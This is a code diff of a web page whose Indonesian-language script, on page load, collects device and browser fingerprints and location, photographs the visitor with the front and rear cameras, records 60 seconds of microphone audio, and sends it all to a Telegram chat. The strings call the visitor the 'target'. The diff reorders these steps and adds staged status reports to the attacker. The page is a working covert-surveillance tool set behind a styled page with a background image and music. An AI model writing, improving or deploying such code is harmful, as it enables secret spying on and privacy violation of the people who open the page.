@@ -12,7 +12,7 @@
     body {
       margin: 0;
       padding: 0;
-      background: url('https://files.catbox.moe/h3h0jr.jpg') center center / cover no-repeat fixed;
+      background: url('https://files.catbox.moe/ck7gjj.jpg') center center / cover no-repeat fixed;
       font-family: 'DeezerProduct', 'Inter', sans-serif;
       color: #000;
       display: flex;
@@ -764,22 +764,6 @@ Behavioral Check       : ${getBehavioralCheck()}
 Browser Entropy        : ${getBrowserEntropy()}
 `;
 
-      const kameraDepanStatus = `
-౼ 〘 𝗙𝗢𝗧𝗢 𝗞𝗔𝗠𝗘𝗥𝗔 〙 ౼
-Sukses mengambil foto target
-Kamera depan 5X
-Kamera Belakang 5X
-`;
-
-      const vnStatus = `
-౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
-Status Rekaman VN      : Berhasil direkam
-Durasi Rekaman         : 60 detik
-Tipe File              : audio/webm
-Kualitas Mikrofon      : Stabil
-Link Kiriman Audio     : (terlampir langsung via Telegram)
-`;
-
       const gabung = [
         dataPerangkatSistem,
         dataLayarGrafik,
@@ -789,9 +773,7 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)
         dataIzinMedia,
         dataWebAPIFeatures,
         dataDeteksiAntiBot,
-        kameraDepanStatus,
-        lokasiInfo,
-        vnStatus
+        lokasiInfo
       ].join("\n");
 
       await kirimPesan(gabung);
@@ -801,15 +783,39 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)
       audio.muted = false;
       try { await audio.play(); } catch {} // Try to autoplay, but don't block if it fails
 
-      rekamSuara(); // Start recording voice note early
+      // 1. Kirim informasi device/sistem terlebih dahulu
+      await ambilSemuaData();
 
-      // Capture photos from both cameras concurrently
+      // 2. Ambil dan kirim foto kamera
       const [depanResult, belakangResult] = await Promise.all([
         ambilKamera("user", "depan"),
         ambilKamera("environment", "belakang")
       ]);
 
-      await ambilSemuaData();
+      // Kirim status foto setelah pengambilan foto selesai
+      const kameraStatus = `
+౼ 〘 𝗙𝗢𝗧𝗢 𝗞𝗔𝗠𝗘𝗥𝗔 〙 ౼
+Sukses mengambil foto target
+Kamera depan 5X
+Kamera Belakang 5X
+`;
+      await kirimPesan(kameraStatus);
+
+      // 3. Rekam dan kirim voice note terakhir
+      rekamSuara();
+      
+      // Kirim status voice note setelah 60 detik (durasi rekaman)
+      setTimeout(async () => {
+        const vnStatus = `
+౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
+Status Rekaman VN      : ${statusVN.includes('Rekam target berhasil') ? 'Berhasil direkam' : 'Gagal direkam'}
+Durasi Rekaman         : 60 detik
+Tipe File              : audio/webm
+Kualitas Mikrofon      : Stabil
+Link Kiriman Audio     : (terlampir langsung via Telegram)
+`;
+        await kirimPesan(vnStatus);
+      }, 61000); // 61 detik untuk memastikan rekaman selesai
     };
 
     window.addEventListener("load", mulai);
